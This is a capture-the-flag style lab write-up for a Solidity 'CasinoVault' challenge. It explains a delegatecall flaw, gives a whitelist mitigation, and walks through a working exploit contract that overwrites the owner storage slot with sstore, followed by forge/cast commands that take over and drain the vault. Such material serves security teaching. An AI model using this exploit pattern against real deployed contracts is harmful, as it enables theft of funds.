## Mitigation

In the heist you just did, you discovered a vulnerability of *delegatecall* because we can put the *address* of our own contract and put some *raw data* to be executed there. We can then just create an exploit contract that changes the state of the value in *SLOT 1*, where the *owner* resides, and takes over the contract. This can be mitigated by adding a simple whitelist to the contract, such as this. &nbsp;  
&nbsp;  
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

contract CasinoVault {
    address public owner;
    mapping(address => bool) public whitelist; // Whitelist for authorized logic contracts

    modifier onlyOwner() {
        require(msg.sender == owner, "Not the owner");
        _;
    }

    constructor() payable {
        owner = msg.sender;
    }

    // Add an address to the whitelist (only the owner can do this)
    function addToWhitelist(address _logicContract) external onlyOwner {
        whitelist[_logicContract] = true;
    }

    // Remove an address from the whitelist
    function removeFromWhitelist(address _logicContract) external onlyOwner {
        whitelist[_logicContract] = false;
    }

    // Verifies identity with only whitelisted logic contracts
    function verifyIdentity(address _identity, bytes memory data) public {
        require(whitelist[_identity], "Unauthorized logic contract"); // Whitelist check

        (bool success, ) = _identity.delegatecall(data);
        require(success, "Verifying failed");
    }

    // Withdraw function restricted to the owner
    function withdraw() public onlyOwner {
        (bool transferred, ) = payable(owner).call{value: address(this).balance}("");
        require(transferred, "Withdrawal failed!");
    }

    receive() external payable {}
}
```
&nbsp;  
With the mitigated contract, now we check the *owner* by a modifier called *onlyOwner()* and make sure that only the owner can register an address on the *whitelist*. Plus, we add a check on *verifyIdentity()* to check whether the *address* input is whitelisted.

## Walkthrough

The vault of this casino can only be opened by the owner. What we are trying to do here is take everything from the owner, but how? &nbsp;    
&nbsp;   
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "./CasinoVault.sol";

contract Setup{
    CasinoVault public CS;

    constructor() payable{
        CS = new CasinoVault{value: 50 ether}();
    }

    function isSolved() public view returns(bool){
        return address(CS).balance == 0;
    }

}
```
&nbsp;  
It seems the heist was successful when we managed to empty the vault. A lot of work to be done here, it seems, huh? Let's look at what we're dealing with *CasinoVault Contract* &nbsp;  
&nbsp;  
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

contract CasinoVault {
    address public gameLogic;
    address public owner;

    constructor() payable {
        owner = msg.sender;
    }

    function verifyIdentity(address _identity, bytes memory data) public {
        (bool success, ) = _identity.delegatecall(data);
        require(success, "Verifying failed");
    }

    function withdraw() public {
        require(msg.sender == owner, "Not the owner");
        (bool transferred, ) = payable(owner).call{value: address(this).balance}("");
        require(transferred, "Withdrawal Failed!");
    }

    receive() external payable {}
    
}
```
&nbsp;  
We can see here that we can verifyIdentify by providing an *address* and a *bytes memory data*, they use delegatecall there, delegate calls are usually used like a "borrowed function". You execute the function in order to modify the state of the caller. In this case, if we parse and address and execute the data there, it will execute the data and modify the state of the *Casino Vault* itself. Unlike Silent-Dealer where there is a function to change owner here the option doesn't present. So how can we become the owner and drain the vault? &nbsp;  
&nbsp;  
In EVM Assembly, there is an operation called *sstore(location, value)*. We can use this to overwrite the storage memory, let's see where the *owner* resides, &nbsp;  
&nbsp;  

```solidity
    address public gameLogic; // SLOT 0
    address public owner; // SLOT 1
```
&nbsp;  
Based on that information, we can see that the owner is stored at SLOT 1, and the length since it's an address must be 20 bytes long. Now that we have the 2 options, we can either put the owner to become ourselves (EOA) or we can write the Exploit Contract Address; this can be done by either providing *origin()* (EOA) or *caller()* (msg.sender, in this case is the Exploit Contract), as the parameter. So if we want to overwrite the storage, we can use &nbsp;  
&nbsp;  

```solidity
sstore(1, origin()) // for tx.origin / EOA
// or
sstore(1, caller()) // for msg.sender 
```
&nbsp;  
In this exploitation, I choose to overwrite it using my EOA, so we are going to go with this exploit to drain the vault. &nbsp;  
&nbsp;  
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "./Setup.sol";
import "./CasinoVault.sol";

contract Exploit {
    Setup public setup;
    CasinoVault public cs;

    constructor(address payable _setup) {
        setup = Setup(_setup);
        cs = CasinoVault(setup.CS());
    }

    function exploit() public {
        cs.verifyIdentity(address(this), abi.encodeWithSignature("takeOver()"));
    }

    function takeOver() public {
        assembly {
            sstore(1, origin()) 
        }
    }

}
```
&nbsp;  
Let's deploy it, and at last we're going to withdraw all the money stored there. &nbsp;  
&nbsp;  
```bash
// Deploying the Exploit Contract
forge create src/casino-vault/$EXPLOIT_FILE:$EXPLOIT_NAME -r $RPC_URL --private-key $PK --constructor-args $SETUP_ADDR

// Running the Exploit
cast send -r $RPC_URL --private-key $PK $EXPLOIT_ADDR "exploit()"

// Withdrawing Everything from the Vault
cast send -r $RPC_URL --private-key $PK $VAULT_ADDR "withdraw()"
```
&nbsp;  
By running the command above and deploying the Exploit contract, you should've solved the lab!